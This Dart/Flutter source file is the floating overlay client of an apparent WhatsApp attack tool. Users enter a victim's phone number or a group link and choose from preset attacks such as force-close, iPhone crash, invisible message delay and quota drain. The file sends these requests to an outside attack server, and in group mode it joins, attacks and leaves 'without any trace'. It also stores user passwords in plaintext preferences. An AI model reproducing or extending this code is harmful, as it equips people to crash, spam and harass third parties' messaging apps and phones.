import 'dart:convert';
import 'dart:ui' as ui;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import '../main.dart';

final GlobalKey<NavigatorState> floatingBugNavigatorKey = navigatorKey;

class FloatingBugService {
  static final FloatingBugService _instance = FloatingBugService._internal();
  factory FloatingBugService() => _instance;
  FloatingBugService._internal();

  static const String PREF_IS_ENABLED = 'floating_bug_enabled';
  static const String PREF_USERNAME = 'floating_bug_username';
  static const String PREF_PASSWORD = 'floating_bug_password';
  static const String PREF_SESSION_KEY = 'floating_bug_session_key';
  static const String PREF_ROLE = 'floating_bug_role';
  static const String PREF_EXPIRED = 'floating_bug_expired';
  static const String PREF_BUG_LIST = 'floating_bug_list';

  bool _isInitialized = false;
  bool _isEnabled = false;
  FloatingOverlay? _overlay;
  
  String username = '';
  String password = '';
  String sessionKey = '';
  String role = '';
  String expiredDate = '';
  List<Map<String, dynamic>> listBug = [];

  Future<void> initialize() async {
    if (_isInitialized) return;
    await _loadSavedData();
    _isInitialized = true;
  }

  Future<void> _loadSavedData() async {
    final prefs = await SharedPreferences.getInstance();
    _isEnabled = prefs.getBool(PREF_IS_ENABLED) ?? false;
    username = prefs.getString(PREF_USERNAME) ?? 'User';
    password = prefs.getString(PREF_PASSWORD) ?? '';
    sessionKey = prefs.getString(PREF_SESSION_KEY) ?? '';
    role = prefs.getString(PREF_ROLE) ?? 'FREE';
    expiredDate = prefs.getString(PREF_EXPIRED) ?? 'No Expiry';
    
    final bugListString = prefs.getString(PREF_BUG_LIST);
    if (bugListString != null) {
      listBug = List<Map<String, dynamic>>.from(jsonDecode(bugListString));
    } else {
      listBug = [
        {'bug_id': 'layinvisible', 'bug_name': 'DELAY INVISIBLE BEBAS SPAM ( 80% AMAN DARI KENON )'},
        {'bug_id': 'click', 'bug_name': 'BLANK CLICK X FORCE CLOSE NEW'},
        {'bug_id': 'blank_spam', 'blank_spam': 'BLANK SPAM MESSAGE TO TARGET'},
        {'bug_id': 'spam_call', 'spam_call': 'BLANK SYSTEM ANDORID NEW'},
        {'bug_id': 'hard', 'bug_name': 'COMBO ALL BLANK ANDROID'},
        {'bug_id': 'delay', 'bug_name': 'DELAY HARD INVISIBLE MESSAGE NEW'},
        {'bug_id': 'dozer', 'bug_name': 'DELAY BULDOZER SEDOT QUOTA INVISIBLE'},
        {'bug_id': 'fcclick', 'bug_name': 'FORCE CLOSE CLICK X FREZEE NEW'},
        {'bug_id': 'crash_ios', 'bug_name': 'CRASH IPHONE SPAM MESSAGE NEW'},
        {'bug_id': 'kill_ios', 'bug_name': 'COMBO ALL CRASH IPHONE LIST"'},
      ];
    }
  }

  Future<void> saveSessionData({
    required String username,
    required String password,
    required String sessionKey,
    required String role,
    required String expiredDate,
    required List<Map<String, dynamic>> listBug,
  }) async {
    final prefs = await SharedPreferences.getInstance();
    
    this.username = username;
    this.password = password;
    this.sessionKey = sessionKey;
    this.role = role;
    this.expiredDate = expiredDate;
    this.listBug = listBug;
    
    await prefs.setString(PREF_USERNAME, username);
    await prefs.setString(PREF_PASSWORD, password);
    await prefs.setString(PREF_SESSION_KEY, sessionKey);
    await prefs.setString(PREF_ROLE, role);
    await prefs.setString(PREF_EXPIRED, expiredDate);
    await prefs.setString(PREF_BUG_LIST, jsonEncode(listBug));
  }

  Future<void> toggleEnabled() async {
    final prefs = await SharedPreferences.getInstance();
    _isEnabled = !_isEnabled;
    await prefs.setBool(PREF_IS_ENABLED, _isEnabled);
    
    if (_isEnabled) {
      showOverlay();
    } else {
      hideOverlay();
    }
  }

  void showOverlay() {
    if (!_isInitialized) return;
    if (!_isEnabled) return;
    if (floatingBugNavigatorKey.currentContext == null) {
      Future.delayed(const Duration(milliseconds: 500), () {
        showOverlay();
      });
      return;
    }
    _overlay?.close();
    _overlay = FloatingOverlay(
      username: username,
      sessionKey: sessionKey,
      listBug: listBug,
      role: role,
      expiredDate: expiredDate,
      onClose: () {
        _isEnabled = false;
        SharedPreferences.getInstance().then((prefs) {
          prefs.setBool(PREF_IS_ENABLED, false);
        });
      },
    );
    _overlay?.show();
  }

  void hideOverlay() {
    _overlay?.close();
    _overlay = null;
  }

  bool get isEnabled => _isEnabled;
}

class FloatingOverlay {
  final String username;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;
  final VoidCallback onClose;
  
  FloatingOverlay({
    required this.username,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
    required this.onClose,
  });

  OverlayEntry? _entry;
  
  void show() {
    _entry = OverlayEntry(
      builder: (context) => Positioned(
        top: 100,
        right: 20,
        child: FloatingBugWidget(
          username: username,
          sessionKey: sessionKey,
          listBug: listBug,
          role: role,
          expiredDate: expiredDate,
          onClose: onClose,
        ),
      ),
    );
    
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_entry != null && floatingBugNavigatorKey.currentContext != null) {
        Overlay.of(floatingBugNavigatorKey.currentContext!).insert(_entry!);
      }
    });
  }
  
  void close() {
    _entry?.remove();
    _entry = null;
  }
}

class FloatingBugWidget extends StatefulWidget {
  final String username;
  final String sessionKey;
  final List<Map<String, dynamic>> listBug;
  final String role;
  final String expiredDate;
  final VoidCallback onClose;

  const FloatingBugWidget({
    super.key,
    required this.username,
    required this.sessionKey,
    required this.listBug,
    required this.role,
    required this.expiredDate,
    required this.onClose,
  });

  @override
  State<FloatingBugWidget> createState() => _FloatingBugWidgetState();
}

class _FloatingBugWidgetState extends State<FloatingBugWidget>
    with SingleTickerProviderStateMixin {
  bool _isExpanded = false;
  bool _isSending = false;
  String _selectedBugId = '';
  int _selectedBugIndex = 0;
  final TextEditingController _targetController = TextEditingController();
  final TextEditingController _groupLinkController = TextEditingController();
  bool _isGroupMode = false;
  Offset _position = const Offset(20, 100);
  late AnimationController _pulseController;
  
  final Color primaryDark = const Color(0xFF000000);
  final Color cardDark = const Color(0xFF1A1A1A);
  final Color cardDarker = const Color(0xFF0D0D0D);
  final Color goldColor = const Color(0xFFFFD700);
  final Color blueColor = const Color(0xFF4A9EFF);
  final Color redColor = const Color(0xFFDC143C);

  @override
  void initState() {
    super.initState();
    if (widget.listBug.isNotEmpty) {
      _selectedBugId = widget.listBug[0]['bug_id'];
    }
    
    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    )..repeat(reverse: true);
  }

  @override
  void dispose() {
    _targetController.dispose();
    _groupLinkController.dispose();
    _pulseController.dispose();
    super.dispose();
  }

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d+]'), '');
    if (!cleaned.startsWith('+') || cleaned.length < 8) return null;
    return cleaned;
  }

  Future<void> _sendBug() async {
    if (_isGroupMode) {
      await _attackGroup();
    } else {
      await _sendContactBug();
    }
  }

  Future<void> _sendContactBug() async {
    final rawInput = _targetController.text.trim();
    final target = formatPhoneNumber(rawInput);
    final key = widget.sessionKey;

    if (target == null || key.isEmpty) {
      _showAlert("Invalid Number",
          "Gunakan nomor internasional (misal: +62, 1, 44), bukan 08xxx.");
      return;
    }

    setState(() => _isSending = true);

    try {
      final res = await http.get(Uri.parse(
          "http://xhofficial.premgpt.web.id:3547/sendBug?key=$key&target=$target&bug=$_selectedBugId"));
      final data = jsonDecode(res.body);

      if (data["cooldown"] == true) {
        _showAlert("Cooldown", "Tunggu beberapa saat.");
      } else if (data["valid"] == false) {
        _showAlert("Invalid", "Session key invalid.");
      } else if (data['sender'] == false) {
        _showAlert("Failed", "kamu tidak memiliki sender pribadi!\nsilahkan add sender terlebih dahulu");
      } else if (data["sended"] == false) {
        _showAlert("Failed", "Server sedang maintenance.");
      } else {
        _showAlert("Success", "Berhasil mengirim bug ke $target!\nMenggunakan sender pribadi");
        _targetController.clear();
      }
    } catch (_) {
      _showAlert("Error", "Terjadi kesalahan. Coba lagi.");
    } finally {
      setState(() => _isSending = false);
    }
  }

  Future<void> _attackGroup() async {
    final groupLink = _groupLinkController.text.trim();
    final key = widget.sessionKey;
    
    if (groupLink.isEmpty || !groupLink.contains('chat.whatsapp.com')) {
      _showAlert("Invalid Link", "Please enter a valid WhatsApp group link.");
      return;
    }

    setState(() => _isSending = true);

    try {
      final response = await http.get(
        Uri.parse("http://xhofficial.premgpt.web.id:3547/bugGroup?key=$key&link=$groupLink&bug=$_selectedBugId")
      ).timeout(const Duration(seconds: 30));

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        
        if (data['valid'] == false) {
          _showAlert("Failed", "Invalid session key. Please login again.");
          return;
        }
        
        if (data["cooldown"] == true) {
          _showAlert("Cooldown", "Tunggu beberapa saat.");
          return;
        }
        
        if (data['sender'] == false) {
          _showAlert("Failed", "kamu tidak memiliki sender pribadi!\nsilahkan add sender terlebih dahulu");
          return;
        }
        
        if (data['sended'] == true) {
          _showAlert("Success", "Successfully sent bug to group!\nUsing private sender");
          _groupLinkController.clear();
        } else {
          _showAlert("Failed", "Failed to send bug to group. Please try again.");
        }
      }
    } catch (e) {
      _showAlert("Error", "An error occurred. Please check your connection and try again.");
    } finally {
      setState(() => _isSending = false);
    }
  }

  void _showAlert(String title, String msg) {
    showDialog(
      context: context,
      builder: (_) => BackdropFilter(
        filter: ui.ImageFilter.blur(sigmaX: 15, sigmaY: 15),
        child: Dialog(
          backgroundColor: Colors.transparent,
          child: Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [cardDark.withOpacity(0.95), cardDarker.withOpacity(0.98)],
              ),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: Colors.white.withOpacity(0.15)),
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Icon(
                  title.contains('✅') ? Icons.check_circle : Icons.error,
                  color: title.contains('✅') ? Colors.green : Colors.red,
                  size: 48,
                ),
                const SizedBox(height: 16),
                Text(title, style: const TextStyle(color: Colors.white, fontSize: 20, fontWeight: FontWeight.bold)),
                const SizedBox(height: 8),
                Text(msg, style: TextStyle(color: Colors.white.withOpacity(0.8)), textAlign: TextAlign.center),
                const SizedBox(height: 24),
                ElevatedButton(
                  onPressed: () => Navigator.pop(context),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.white.withOpacity(0.1),
                    shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
                  ),
                  child: const Text("OK", style: TextStyle(color: Colors.white)),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Stack(
      children: [
        if (!_isExpanded)
          GestureDetector(
            onPanUpdate: (details) {
              setState(() {
                _position = Offset(
                  _position.dx + details.delta.dx,
                  _position.dy + details.delta.dy,
                );
              });
            },
            child: AnimatedPositioned(
              duration: const Duration(milliseconds: 200),
              left: _position.dx,
              top: _position.dy,
              child: GestureDetector(
                onTap: () => setState(() => _isExpanded = true),
                child: ScaleTransition(
                  scale: Tween(begin: 0.9, end: 1.1).animate(_pulseController),
                  child: Container(
                    width: 64,
                    height: 64,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: LinearGradient(
                        colors: [cardDark, cardDarker],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ),
                      border: Border.all(
                        color: goldColor.withOpacity(0.5),
                        width: 2,
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: Colors.black.withOpacity(0.5),
                          blurRadius: 15,
                          spreadRadius: 2,
                        ),
                      ],
                    ),
                    child: ClipOval(
                      child: Image.asset(
                        'assets/image/logo.jpg',
                        fit: BoxFit.cover,
                        errorBuilder: (context, error, stackTrace) {
                          return Container(
                            color: cardDark,
                            child: const Icon(
                              Icons.bug_report,
                              color: Colors.white,
                              size: 32,
                            ),
                          );
                        },
                      ),
                    ),
                  ),
                ),
              ),
            ),
          ),
        
        if (_isExpanded)
          Positioned.fill(
            child: Container(
              color: Colors.black.withOpacity(0.7),
              child: Center(
                child: SingleChildScrollView(
                  child: Container(
                    margin: const EdgeInsets.all(20),
                    width: 380,
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [cardDark.withOpacity(0.98), cardDarker.withOpacity(0.99)],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ),
                      borderRadius: BorderRadius.circular(32),
                      border: Border.all(
                        color: Colors.white.withOpacity(0.1),
                        width: 1.5,
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: Colors.black.withOpacity(0.7),
                          blurRadius: 40,
                          spreadRadius: 5,
                        ),
                      ],
                    ),
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(32),
                      child: BackdropFilter(
                        filter: ui.ImageFilter.blur(sigmaX: 20, sigmaY: 20),
                        child: Container(
                          padding: const EdgeInsets.all(24),
                          decoration: BoxDecoration(
                            color: Colors.white.withOpacity(0.05),
                          ),
                          child: Column(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Row(
                                children: [
                                  Container(
                                    width: 50,
                                    height: 50,
                                    decoration: BoxDecoration(
                                      shape: BoxShape.circle,
                                      border: Border.all(
                                        color: goldColor.withOpacity(0.5),
                                        width: 2,
                                      ),
                                    ),
                                    child: ClipOval(
                                      child: Image.asset(
                                        'assets/image/logo.jpg',
                                        fit: BoxFit.cover,
                                        errorBuilder: (context, error, stackTrace) {
                                          return Container(
                                            color: cardDark,
                                            child: const Icon(Icons.bug_report, color: Colors.white),
                                          );
                                        },
                                      ),
                                    ),
                                  ),
                                  const SizedBox(width: 12),
                                  Expanded(
                                    child: Column(
                                      crossAxisAlignment: CrossAxisAlignment.start,
                                      children: [
                                        Text(
                                          widget.username,
                                          style: const TextStyle(
                                            color: Colors.white,
                                            fontWeight: FontWeight.bold,
                                            fontSize: 18,
                                          ),
                                        ),
                                        Text(
                                          widget.role,
                                          style: TextStyle(
                                            color: redColor.withOpacity(0.8),
                                            fontSize: 12,
                                          ),
                                        ),
                                      ],
                                    ),
                                  ),
                                  Container(
                                    padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                                    decoration: BoxDecoration(
                                      color: Colors.white.withOpacity(0.1),
                                      borderRadius: BorderRadius.circular(8),
                                      border: Border.all(color: goldColor.withOpacity(0.3)),
                                    ),
                                    child: Text(
                                      "EXP: ${widget.expiredDate}",
                                      style: TextStyle(
                                        color: goldColor,
                                        fontSize: 10,
                                        fontWeight: FontWeight.bold,
                                      ),
                                    ),
                                  ),
                                ],
                              ),
                              const SizedBox(height: 20),
                              
                              Container(
                                padding: const EdgeInsets.all(4),
                                decoration: BoxDecoration(
                                  color: Colors.white.withOpacity(0.05),
                                  borderRadius: BorderRadius.circular(16),
                                ),
                                child: Row(
                                  children: [
                                    Expanded(
                                      child: _buildModeButton(
                                        icon: Icons.person,
                                        label: "Contact Bug",
                                        isSelected: !_isGroupMode,
                                        onTap: () => setState(() => _isGroupMode = false),
                                      ),
                                    ),
                                    const SizedBox(width: 4),
                                    Expanded(
                                      child: _buildModeButton(
                                        icon: Icons.groups,
                                        label: "Group Bug",
                                        isSelected: _isGroupMode,
                                        onTap: () => setState(() => _isGroupMode = true),
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                              const SizedBox(height: 16),
                              
                              Container(
                                decoration: BoxDecoration(
                                  color: Colors.white.withOpacity(0.05),
                                  borderRadius: BorderRadius.circular(16),
                                  border: Border.all(
                                    color: Colors.white.withOpacity(0.1),
                                    width: 1,
                                  ),
                                ),
                                child: TextField(
                                  controller: _isGroupMode ? _groupLinkController : _targetController,
                                  style: const TextStyle(color: Colors.white, fontSize: 14),
                                  cursorColor: redColor,
                                  decoration: InputDecoration(
                                    hintText: _isGroupMode 
                                        ? "https://chat.whatsapp.com/..." 
                                        : "e.g. +62xxxxxxxxxx",
                                    hintStyle: TextStyle(
                                      color: Colors.white.withOpacity(0.3),
                                      fontSize: 13,
                                    ),
                                    prefixIcon: Icon(
                                      _isGroupMode ? Icons.link : Icons.language,
                                      color: Colors.white.withOpacity(0.4),
                                      size: 20,
                                    ),
                                    border: InputBorder.none,
                                    contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                                  ),
                                ),
                              ),
                              const SizedBox(height: 16),
                              
                              if (!_isGroupMode) ...[
                                SizedBox(
                                  height: 100,
                                  child: ListView.builder(
                                    scrollDirection: Axis.horizontal,
                                    itemCount: widget.listBug.length,
                                    itemBuilder: (context, index) {
                                      final bug = widget.listBug[index];
                                      final isSelected = index == _selectedBugIndex;
                                      
                                      return GestureDetector(
                                        onTap: () => setState(() {
                                          _selectedBugIndex = index;
                                          _selectedBugId = bug['bug_id'];
                                        }),
                                        child: Container(
                                          width: 140,
                                          margin: const EdgeInsets.only(right: 8),
                                          padding: const EdgeInsets.all(12),
                                          decoration: BoxDecoration(
                                            color: isSelected 
                                                ? primaryDark.withOpacity(0.8)
                                                : Colors.white.withOpacity(0.05),
                                            borderRadius: BorderRadius.circular(12),
                                            border: Border.all(
                                              color: isSelected 
                                                  ? goldColor
                                                  : Colors.white.withOpacity(0.1),
                                              width: 1,
                                            ),
                                          ),
                                          child: Column(
                                            crossAxisAlignment: CrossAxisAlignment.start,
                                            mainAxisAlignment: MainAxisAlignment.center,
                                            children: [
                                              Icon(
                                                FontAwesomeIcons.whatsapp,
                                                color: isSelected ? goldColor : Colors.white54,
                                                size: 18,
                                              ),
                                              const SizedBox(height: 8),
                                              Text(
                                                bug['bug_name'],
                                                style: TextStyle(
                                                  color: isSelected ? Colors.white : Colors.white70,
                                                  fontSize: 12,
                                                  fontWeight: FontWeight.bold,
                                                ),
                                                maxLines: 2,
                                                overflow: TextOverflow.ellipsis,
                                              ),
                                            ],
                                          ),
                                        ),
                                      );
                                    },
                                  ),
                                ),
                                const SizedBox(height: 8),
                              ],
                              
                              SizedBox(
                                width: double.infinity,
                                height: 56,
                                child: ElevatedButton(
                                  onPressed: _isSending ? null : _sendBug,
                                  style: ElevatedButton.styleFrom(
                                    backgroundColor: Colors.white.withOpacity(0.1),
                                    foregroundColor: Colors.white,
                                    shape: RoundedRectangleBorder(
                                      borderRadius: BorderRadius.circular(16),
                                      side: BorderSide(
                                        color: goldColor.withOpacity(0.5),
                                        width: 1.5,
                                      ),
                                    ),
                                  ),
                                  child: _isSending
                                      ? const SizedBox(
                                          width: 24,
                                          height: 24,
                                          child: CircularProgressIndicator(
                                            color: Colors.white,
                                            strokeWidth: 2,
                                          ),
                                        )
                                      : Row(
                                          mainAxisAlignment: MainAxisAlignment.center,
                                          children: [
                                            Icon(_isGroupMode ? Icons.groups : Icons.send, size: 18),
                                            const SizedBox(width: 8),
                                            Text(
                                              _isGroupMode ? "ATTACK GROUP" : "SEND BUG",
                                              style: const TextStyle(
                                                fontWeight: FontWeight.bold,
                                                fontSize: 14,
                                                letterSpacing: 1,
                                              ),
                                            ),
                                          ],
                                        ),
                                ),
                              ),
                              const SizedBox(height: 12),
                              
                              Container(
                                padding: const EdgeInsets.all(12),
                                decoration: BoxDecoration(
                                  color: Colors.white.withOpacity(0.02),
                                  borderRadius: BorderRadius.circular(12),
                                ),
                                child: Row(
                                  children: [
                                    Icon(Icons.info_outline, color: Colors.white.withOpacity(0.3), size: 16),
                                    const SizedBox(width: 8),
                                    Expanded(
                                      child: Text(
                                        _isGroupMode
                                            ? "This tool will automatically join the group, send a bug, and leave without any trace."
                                            : "Use responsibly. We are not responsible for misuse.",
                                        style: TextStyle(
                                          color: Colors.white.withOpacity(0.3),
                                          fontSize: 11,
                                        ),
                                      ),
                                    ),
                                  ],
                                ),
                              ),
                            ],
                          ),
                        ),
                      ),
                    ),
                  ),
                ),
              ),
            ),
          ),
      ],
    );
  }

  Widget _buildModeButton({
    required IconData icon,
    required String label,
    required bool isSelected,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 10),
        decoration: BoxDecoration(
          color: isSelected ? Colors.white.withOpacity(0.15) : Colors.transparent,
          borderRadius: BorderRadius.circular(12),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, color: Colors.white, size: 16),
            const SizedBox(width: 6),
            Text(
              label,
              style: TextStyle(
                color: Colors.white,
                fontSize: 12,
                fontWeight: isSelected ? FontWeight.bold : FontWeight.normal,
              ),
            ),
          ],
        ),
      ),
    );
  }
}

extension FloatingBugControl on BuildContext {
  Future<void> toggleFloatingBug() => FloatingBugService().toggleEnabled();
  
  Future<void> updateFloatingBugSession({
    required String username,
    required String password,
    required String sessionKey,
    required String role,
    required String expiredDate,
    required List<Map<String, dynamic>> listBug,
  }) async {
    final service = FloatingBugService();
    await service.saveSessionData(
      username: username,
      password: password,
      sessionKey: sessionKey,
      role: role,
      expiredDate: expiredDate,
      listBug: listBug,
    );
  }
  
  bool isFloatingBugEnabled() => FloatingBugService().isEnabled;
}